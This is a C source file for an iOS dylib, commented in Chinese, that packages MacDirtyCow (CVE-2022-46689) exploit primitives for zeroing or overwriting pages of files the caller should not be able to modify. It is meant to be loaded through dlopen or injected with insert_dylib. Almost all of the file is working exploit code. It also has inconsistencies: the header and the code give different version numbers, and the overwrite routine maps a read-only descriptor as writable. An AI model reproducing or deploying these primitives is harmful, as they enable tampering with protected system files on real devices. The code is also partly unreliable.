/*
 * mdcx_core.c — mdcX Max 2.3.0 核心利用库 (arm64, iOS)
 * ------------------------------------------------------------------
 * 自包含的 MacDirtyCow (CVE-2022-46689) 文件页操作原语，
 * 编译为独立 dylib，可由 App dlopen 调用或经 insert_dylib 注入。
 *
 * 注意：iPhoneOS SDK 不提供 mach/mach_vm.h，因此这里使用公开的
 * vm_behavior_set / vm_deallocate（arm64 上 vm_address_t/vm_size_t
 * 本身就是 64 位，与 mach_vm_* 变体等价）。
 *
 * 导出接口：
 *   const char *mdcx_core_version(void);
 *   int         mdcx_zero_file(const char *path);                 // 清零首页
 *   int         mdcx_zero_file_pages(const char *path, int all);  // 清零首页/全部页
 *   int         mdcx_overwrite_file(const char *path,
 *                                   const unsigned char *data,
 *                                   unsigned int len);            // 备份覆盖写
 *
 * 返回码：0 成功；1 open 失败；2 mmap 失败；3 页操作失败；
 *         4 mlock 失败；5 deallocate 失败；负值为参数/状态错误。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <mach/mach.h>
#include <mach/vm_map.h>

#define MDCX_CORE_VERSION "2.3.6"

__attribute__((visibility("default")))
const char *mdcx_core_version(void) {
    return MDCX_CORE_VERSION;
}

/* 单页清零：zero-wired-page 行为 + mlock + 拆除映射，迫使零页回写 */
static int mdcx_zero_page(vm_address_t page, vm_size_t page_size) {
    kern_return_t kr;

    kr = vm_behavior_set(mach_task_self(), page, page_size,
                         VM_BEHAVIOR_ZERO_WIRED_PAGES);
    if (kr != KERN_SUCCESS) return 3;

    if (mlock((void *)page, (size_t)page_size) != 0) {
        vm_behavior_set(mach_task_self(), page, page_size, VM_BEHAVIOR_DEFAULT);
        return 4;
    }

    kr = vm_deallocate(mach_task_self(), page, page_size);
    if (kr != KERN_SUCCESS) {
        munlock((void *)page, (size_t)page_size);
        vm_behavior_set(mach_task_self(), page, page_size, VM_BEHAVIOR_DEFAULT);
        return 5;
    }
    return 0;
}

__attribute__((visibility("default")))
int mdcx_zero_file_pages(const char *path, int all_pages) {
    int fd, rc, pages, i;
    struct stat st;
    void *map;
    size_t map_len;
    long page_size;

    if (path == NULL || path[0] == '\0') return -1;

    fd = open(path, O_RDONLY);
    if (fd == -1) return 1;

    if (fstat(fd, &st) != 0) { close(fd); return -2; }
    if (st.st_size <= 0) { close(fd); return 0; }

    page_size = sysconf(_SC_PAGESIZE);
    if (page_size <= 0) page_size = 16384;
    map_len = (size_t)st.st_size;

    map = mmap(NULL, map_len, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) { close(fd); return 2; }

    pages = all_pages
        ? (int)(((size_t)st.st_size + (size_t)page_size - 1) / (size_t)page_size)
        : 1;

    rc = 0;
    for (i = 0; i < pages; i++) {
        vm_address_t page = (vm_address_t)map + (vm_size_t)i * (vm_size_t)page_size;
        rc = mdcx_zero_page(page, (vm_size_t)page_size);
        if (rc != 0) break;
    }

    munmap(map, map_len);
    close(fd);
    return rc;
}

__attribute__((visibility("default")))
int mdcx_zero_file(const char *path) {
    return mdcx_zero_file_pages(path, 0);
}

__attribute__((visibility("default")))
int mdcx_overwrite_file(const char *path, const unsigned char *data, unsigned int len) {
    int fd, pages, i;
    struct stat st;
    void *map;
    size_t map_len, write_len;
    long page_size;

    if (path == NULL || path[0] == '\0' || data == NULL || len == 0) return -1;

    fd = open(path, O_RDONLY);
    if (fd == -1) return 1;

    if (fstat(fd, &st) != 0) { close(fd); return -2; }
    if (st.st_size <= 0) { close(fd); return -3; }

    page_size = sysconf(_SC_PAGESIZE);
    if (page_size <= 0) page_size = 16384;

    write_len = (size_t)len < (size_t)st.st_size ? (size_t)len : (size_t)st.st_size;
    map_len = (write_len + (size_t)page_size - 1) & ~((size_t)page_size - 1);

    map = mmap(NULL, map_len, PROT_READ | PROT_WRITE, MAP_FILE | MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) { close(fd); return 2; }

    memcpy(map, data, write_len);
    msync(map, map_len, MS_ASYNC);

    pages = (int)(map_len / (size_t)page_size);
    for (i = 0; i < pages; i++) {
        vm_address_t page = (vm_address_t)map + (vm_size_t)i * (vm_size_t)page_size;
        kern_return_t kr;
        if (mlock((void *)page, (size_t)page_size) != 0) {
            munmap(map, map_len); close(fd); return 4;
        }
        kr = vm_deallocate(mach_task_self(), page, (vm_size_t)page_size);
        if (kr != KERN_SUCCESS) {
            munlock((void *)page, (size_t)page_size);
            munmap(map, map_len); close(fd); return 5;
        }
    }

    close(fd);
    return 0;
}

/* dylib 加载自检标记（可在注入场景的系统日志中确认版本） */
__attribute__((constructor))
static void mdcx_core_constructor(void) {
    fprintf(stderr, "[mdcXCore] v%s loaded (CVE-2022-46689 primitives)\n", MDCX_CORE_VERSION);
}
